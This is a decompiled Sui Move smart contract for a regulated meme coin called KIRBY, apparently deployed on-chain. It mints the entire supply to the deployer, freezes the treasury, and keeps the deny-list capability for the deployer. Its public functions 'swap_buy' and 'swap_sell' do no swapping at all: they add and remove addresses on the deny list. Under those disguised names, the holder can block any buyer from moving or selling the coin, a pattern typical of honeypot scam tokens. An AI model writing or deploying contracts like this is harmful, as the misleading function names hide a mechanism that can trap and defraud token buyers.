module 0xa2d868b1ab1617a9bf0d27991f0d12db540fe7c19b9e5206a2d42b8df6acada9::kirby {
    struct KIRBY has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: KIRBY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<KIRBY>(arg0, 9, b"KIRBY", b"New Baby Elephant Houston Zoo", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmYiYY8h5A69TMkhgLBC1jhjGHWUawaZkEjh4CSunrZJkx"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<KIRBY>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<KIRBY>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<KIRBY>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<KIRBY>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<KIRBY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<KIRBY>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<KIRBY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<KIRBY>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

